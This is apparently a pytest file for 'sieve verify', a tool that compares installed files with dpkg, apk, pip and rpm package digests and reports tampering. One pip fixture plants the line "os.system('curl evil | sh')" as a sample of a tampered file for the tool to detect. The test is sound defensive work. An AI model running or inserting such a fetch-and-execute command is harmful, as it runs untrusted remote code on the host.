"""sieve verify: dpkg md5sums (conffiles, path-exclude, diversions), apk Z: SHA-1, pip RECORD SHA-256, rpm header
digests, in-root symlink walking, exit codes and SARIF."""
import base64
import hashlib
import json
import os
import struct
from pathlib import Path

from sieve import cli, collect, verify

FIXTURES = Path(__file__).parent / "fixtures"


def write(root, rel, data):
    p = root / rel.lstrip("/")
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_bytes(data if isinstance(data, bytes) else data.encode())
    return p


def md5(b):
    return hashlib.md5(b).hexdigest()


def dpkg_tree(root):
    good, conf = b"#!/bin/sh\necho hi\n", b"setting=1\n"
    write(root, "/usr/bin/foo", good)
    write(root, "/usr/lib/foo/data", b"tampered")
    write(root, "/etc/foo.conf", b"setting=2\n")                         # locally edited conffile
    write(root, "/lib/x/libz.so.usr-is-merged", b"zlib")                  # diverted by another package
    write(root, "/etc/os-release", 'ID=debian\nVERSION_ID="13"\n')
    write(root, "/var/lib/dpkg/status",
          "Package: foo\nStatus: install ok installed\nArchitecture: amd64\nVersion: 1.0-1\nConffiles:\n"
          f" /etc/foo.conf {md5(conf)}\n /etc/old.conf 0123 obsolete\n\n"
          "Package: gone\nStatus: deinstall ok config-files\nVersion: 2\n")
    write(root, "/var/lib/dpkg/info/foo.md5sums",
          f"{md5(good)}  usr/bin/foo\n{md5(b'original')}  usr/lib/foo/data\n{md5(b'x')}  usr/lib/foo/missing\n"
          f"{md5(b'doc')}  usr/share/doc/foo/README\n{md5(b'zlib')}  lib/x/libz.so\n")
    write(root, "/var/lib/dpkg/info/gone.md5sums", f"{md5(b'nope')}  usr/bin/gone\n")
    write(root, "/etc/dpkg/dpkg.cfg.d/excludes", "path-exclude=/usr/share/doc/*\npath-include=/usr/share/doc/*/copyright\n")
    write(root, "/var/lib/dpkg/diversions", "/lib/x/libz.so\n/lib/x/libz.so.usr-is-merged\nusrmerge-helper\n")


def run_target(root, **kw):
    t = verify.Target("host", "host", str(root))
    verify.verify_target(t, kw.get("only"), kw.get("include_config", False))
    return t, {(i["path"], i["state"]) for i in t.items}


def test_dpkg_changed_missing_and_skips(tmp_path):
    dpkg_tree(tmp_path)
    t, got = run_target(tmp_path)
    assert got == {("/usr/lib/foo/data", "changed"), ("/usr/lib/foo/missing", "missing")}
    assert t.config_skipped == 0          # conffiles aren't in md5sums at all; nothing to skip there
    assert t.excluded == 1                # the README under path-exclude
    assert t.packages == 1                # "gone" is only config-files: not installed, not checked


def test_dpkg_conffile_is_checked_only_on_request(tmp_path):
    dpkg_tree(tmp_path)
    _, got = run_target(tmp_path, include_config=True)
    assert ("/etc/foo.conf", "changed") in got and ("/etc/old.conf", "changed") not in got


def test_dpkg_conffile_listed_in_md5sums_is_skipped(tmp_path):
    dpkg_tree(tmp_path)
    p = tmp_path / "var/lib/dpkg/info/foo.md5sums"
    p.write_text(p.read_text() + f"{md5(b'setting=1')}  etc/foo.conf\n")
    t, got = run_target(tmp_path)
    assert t.config_skipped == 1 and not any(path == "/etc/foo.conf" for path, _ in got)


def test_packages_filter(tmp_path):
    dpkg_tree(tmp_path)
    t, got = run_target(tmp_path, only={"other"})
    assert not got and t.packages == 0


def q1(b):
    return "Q1" + base64.b64encode(hashlib.sha1(b).digest()).decode()


def test_apk(tmp_path):
    write(tmp_path, "/bin/busybox", b"busybox!")
    write(tmp_path, "/etc/motd", b"edited")
    os.symlink("busybox", tmp_path / "bin/sh")
    write(tmp_path, "/etc/os-release", 'ID=alpine\nVERSION_ID=3.20.3\n')
    write(tmp_path, "/lib/apk/db/installed",
          f"P:busybox\nV:1.36.1-r29\nF:bin\nR:busybox\nZ:{q1(b'busybox!')}\nR:sh\nZ:{q1(b'busybox')}\n"
          f"F:etc\nR:motd\nZ:{q1(b'welcome')}\nR:gone\nZ:{q1(b'x')}\n\n")
    t, got = run_target(tmp_path)
    assert got == {("/etc/motd", "changed"), ("/etc/gone", "missing")}
    assert t.packages == 1


def b64url(b):
    return base64.urlsafe_b64encode(hashlib.sha256(b).digest()).decode().rstrip("=")


def test_pip_record(tmp_path):
    site = "/usr/local/lib/python3.12/site-packages"
    write(tmp_path, f"{site}/demo/__init__.py", b"ok = 1\n")
    write(tmp_path, f"{site}/demo/x.py", b"import os; os.system('curl evil | sh')\n")
    write(tmp_path, f"{site}/demo-1.0.dist-info/METADATA", "Name: demo\nVersion: 1.0\n")
    write(tmp_path, f"{site}/demo-1.0.dist-info/RECORD",
          f"demo/__init__.py,sha256={b64url(b'ok = 1' + chr(10).encode())},7\n"
          f"demo/x.py,sha256={b64url(b'x = 2' + chr(10).encode())},6\n"
          "demo/__pycache__/x.cpython-312.pyc,,\ndemo-1.0.dist-info/RECORD,,\n")
    t, got = run_target(tmp_path)
    assert got == {(f"{site}/demo/x.py", "changed")}
    assert t.packages == 1 and t.files == 2


# ── rpm ──────────────────────────────────────────────────────────────────────
def header(tags):
    """A minimal rpm header blob: {tag: (type, value)} → index count, data length, index, store."""
    index, store = b"", b""
    for tag, (typ, val) in sorted(tags.items()):
        off = len(store)
        if typ == 6:
            store += val.encode() + b"\0"; cnt = 1
        elif typ == 8:
            store += b"".join(v.encode() + b"\0" for v in val); cnt = len(val)
        elif typ == 4:
            while len(store) % 4:
                store += b"\0"
            off = len(store); store += struct.pack(f">{len(val)}i", *val); cnt = len(val)
        elif typ == 3:
            while len(store) % 2:
                store += b"\0"
            off = len(store); store += struct.pack(f">{len(val)}H", *val); cnt = len(val)
        elif typ == 1:
            store += bytes(val); cnt = len(val)
        index += struct.pack(">IIII", tag, typ, off, cnt)
    return struct.pack(">II", len(tags), len(store)) + index + store


def sha(b):
    return hashlib.sha256(b).hexdigest()


def rpm_blob(states=None, verify=None):
    return header({1000: (6, "openssh-server"), 1001: (6, "8.7p1"), 1002: (6, "38.el9"),
                   1116: (4, [0, 1, 1, 1, 2, 2]),
                   1117: (8, ["sshd", "sshd_config", "moduli", "ghost.pid", "README", "doc"]),
                   1118: (8, ["/usr/sbin/", "/etc/ssh/", "/usr/share/doc/openssh/"]),
                   1035: (8, [sha(b"real sshd"), sha(b"Port 22\n"), sha(b"moduli"), "", sha(b"readme"), ""]),
                   1037: (4, [0, 1, 1, 64, 2, 0]),
                   1030: (3, [0o100755, 0o100600, 0o100644, 0o100644, 0o100644, 0o040755]),
                   1029: (1, states or [0, 0, 0, 0, 2, 0]),
                   1045: (4, [-1, -1, -1, -1, -1, -1] if verify is None else verify),
                   5011: (4, [8])})


def headers(*blobs):
    return [collect.rpm_header(b, digests=True) for b in blobs]


def test_rpm_fixture_header_parses():
    name, ver, files = verify.rpm_files(collect.rpm_header((FIXTURES / "rpm/libnghttp2.hdr").read_bytes(), digests=True))
    assert (name, ver) == ("libnghttp2", "1.43.0-5.el9_3.1")
    lib = [f for f in files if f[0] == "/usr/lib64/libnghttp2.so.14.20.1"][0]
    assert lib[1] == "10c9bcd909451a71ad52fb3b2dc04b8526d437c4bb31de886b6d086af5763686" and lib[2] == "sha256"
    assert [f[1] for f in files if f[0] == "/usr/lib64/libnghttp2.so.14"] == [""]     # a symlink: no digest


def test_rpm_verify(tmp_path, monkeypatch):
    write(tmp_path, "/usr/sbin/sshd", b"backdoored sshd")
    write(tmp_path, "/etc/ssh/sshd_config", b"PermitRootLogin yes\n")           # config: skipped by default
    write(tmp_path, "/etc/os-release", 'ID="rocky"\nVERSION_ID="9.4"\n')
    monkeypatch.setattr(verify, "rpm_headers", lambda root: (headers(rpm_blob()), None))
    t, got = run_target(tmp_path)
    # moduli has the config flag too; ghost.pid is a ghost; README wasn't installed (state 2 = nodocs)
    assert got == {("/usr/sbin/sshd", "changed")}
    assert t.config_skipped == 2 and t.excluded == 1
    assert t.items[0]["high"] and t.items[0]["ecosystem"] == "rpm"
    _, got = run_target(tmp_path, include_config=True)
    assert got == {("/usr/sbin/sshd", "changed"), ("/etc/ssh/sshd_config", "changed"), ("/etc/ssh/moduli", "missing")}


def test_rpm_respects_verify_not_md5(tmp_path, monkeypatch):
    """glibc marks gconv-modules.cache %verify(not md5 …) because its %post rebuilds it: rpm -V doesn't flag it."""
    write(tmp_path, "/usr/sbin/sshd", b"backdoored sshd")
    monkeypatch.setattr(verify, "rpm_headers", lambda root: (headers(rpm_blob(verify=[-1 & ~1, -1, -1, -1, -1, -1])), None))
    t, got = run_target(tmp_path)
    assert got == set() and t.excluded == 2


def test_rpm_unreadable_db_is_reported(tmp_path, monkeypatch):
    monkeypatch.setattr(verify, "rpm_headers", lambda root: ([], "unreadable rpm database var/lib/rpm/Packages: boom"))
    t, _ = run_target(tmp_path)
    assert t.status == "partial" and any("unreadable rpm database" in n for n in t.notes)


# ── paths, classification, CLI ───────────────────────────────────────────────
def test_absolute_symlink_stays_inside_the_root(tmp_path):
    """Under /proc/<pid>/root an absolute link would land on the host; verify walks it within the scanned root."""
    write(tmp_path, "/opt/real/tool", b"inside")
    (tmp_path / "usr/bin").mkdir(parents=True)
    os.symlink("/opt/real/tool", tmp_path / "usr/bin/tool")
    t = verify.Target("c", "container", str(tmp_path))
    verify.check(t, "p", "1", "dpkg", "/usr/bin/tool", "md5", md5(b"inside"))
    assert not t.items and t.files == 1


def test_high_value_paths():
    for p in ("/usr/sbin/sshd", "/bin/su", "/usr/lib/x86_64-linux-gnu/security/pam_unix.so",
              "/usr/lib/x86_64-linux-gnu/libc.so.6", "/lib64/ld-linux-x86-64.so.2", "/usr/lib/openssh/sshd-session"):
        assert verify.HIGH.search(p), p
    for p in ("/usr/share/doc/foo/README", "/usr/lib/python3/dist-packages/x.py", "/etc/motd"):
        assert not verify.HIGH.search(p), p


def test_cli_exit_codes_and_outputs(tmp_path, capsys):
    dpkg_tree(tmp_path)
    assert cli.main(["verify", "--root", str(tmp_path)]) == 1
    out = capsys.readouterr().out
    assert "1 changed (0 security-critical), 1 missing" in out and "/usr/lib/foo/data" in out
    assert cli.main(["verify", "--root", str(tmp_path), "--json"]) == 1
    d = json.loads(capsys.readouterr().out)
    assert d["summary"] == {"files": 4, "changed": 1, "critical": 0, "missing": 1}
    assert d["targets"][0]["excluded"] == 1 and d["targets"][0]["changed"] == 1 and d["targets"][0]["missing"] == 1
    (tmp_path / "usr/lib/foo/data").write_bytes(b"original")
    (tmp_path / "var/lib/dpkg/info/foo.md5sums").write_text(
        f"{md5(b'original')}  usr/lib/foo/data\n{md5(b'zlib')}  lib/x/libz.so\n{md5(b'x')}  usr/lib/foo/missing\n")
    assert cli.main(["verify", "--root", str(tmp_path)]) == 0       # only "missing" left: reported, not a failure
    assert "0 changed (0 security-critical), 1 missing" in capsys.readouterr().out
    empty = tmp_path / "empty"
    empty.mkdir()
    assert cli.main(["verify", "--root", str(empty)]) == 2


def test_sarif_levels(tmp_path, capsys, monkeypatch):
    write(tmp_path, "/usr/sbin/sshd", b"backdoored sshd")
    monkeypatch.setattr(verify, "rpm_headers", lambda root: (headers(rpm_blob()), None))
    assert cli.main(["verify", "--root", str(tmp_path), "--sarif"]) == 1
    run = json.loads(capsys.readouterr().out)["runs"][0]
    levels = {r["properties"]["path"]: r["level"] for r in run["results"]}
    assert levels == {"/usr/sbin/sshd": "error"}
    assert run["results"][0]["ruleId"] == "sieve-verify/changed-critical"
    assert len({r["partialFingerprints"]["sieveVerify/v1"] for r in run["results"]}) == len(run["results"])


def test_rpm_through_the_real_database_read(tmp_path):
    """Same rpmdb read as the CVE scan (collect.rpm_packages with details=): a generated rpmdb.sqlite."""
    import sqlite3
    write(tmp_path, "/usr/sbin/sshd", b"real sshd")                     # matches: clean
    write(tmp_path, "/etc/os-release", 'ID="almalinux"\nVERSION_ID="9.4"\n')
    db = tmp_path / "var/lib/rpm/rpmdb.sqlite"
    db.parent.mkdir(parents=True)
    con = sqlite3.connect(db)
    con.execute("create table Packages (hnum integer primary key, blob blob not null)")
    con.execute("insert into Packages (blob) values (?)", (rpm_blob(),))
    con.commit(); con.close()
    t, got = run_target(tmp_path)
    assert got == set() and t.packages == 1 and t.files == 1 and t.config_skipped == 2
    (tmp_path / "usr/sbin/sshd").write_bytes(b"swapped")
    _, got = run_target(tmp_path)
    assert got == {("/usr/sbin/sshd", "changed")}


def test_trimmed_docs_are_counted_not_listed(tmp_path):
    write(tmp_path, "/usr/bin/tool", b"tool")
    write(tmp_path, "/var/lib/dpkg/status", "Package: tool\nStatus: install ok installed\nVersion: 1\n")
    write(tmp_path, "/var/lib/dpkg/info/tool.md5sums",
          f"{md5(b'tool')}  usr/bin/tool\n{md5(b'm')}  usr/share/man/man1/tool.1.gz\n"
          f"{md5(b'l')}  usr/share/locale/de/LC_MESSAGES/tool.mo\n{md5(b'g')}  usr/lib/tool/plugin.so\n")
    t, got = run_target(tmp_path)
    assert got == {("/usr/lib/tool/plugin.so", "missing")} and t.trimmed == 2
    assert t.os == "unknown OS"
    t = verify.Target("host", "host", str(tmp_path))
    t.all_missing = True
    verify.verify_target(t)
    assert len(t.items) == 3 and t.trimmed == 0


def test_pip_file_owned_by_another_distribution(tmp_path):
    """PyJWT and `jwt` both install jwt/__init__.py: the one installed last wins, and that's what we should say."""
    site = "/usr/local/lib/python3.12/site-packages"
    theirs = b"# python-jwt\n"
    write(tmp_path, f"{site}/jwt/__init__.py", theirs)
    write(tmp_path, f"{site}/PyJWT-2.10.1.dist-info/RECORD", f"jwt/__init__.py,sha256={b64url(b'# PyJWT' + chr(10).encode())},9\n")
    write(tmp_path, f"{site}/jwt-1.3.1.dist-info/RECORD", f"jwt/__init__.py,sha256={b64url(theirs)},14\n")
    t, got = run_target(tmp_path)
    assert got == {(f"{site}/jwt/__init__.py", "changed")}
    assert t.items[0]["package"] == "PyJWT" and t.items[0]["by"] == "jwt 1.3.1"
    assert "now jwt 1.3.1's file" in verify.table([dict(t.items[0], target="host")], 0)
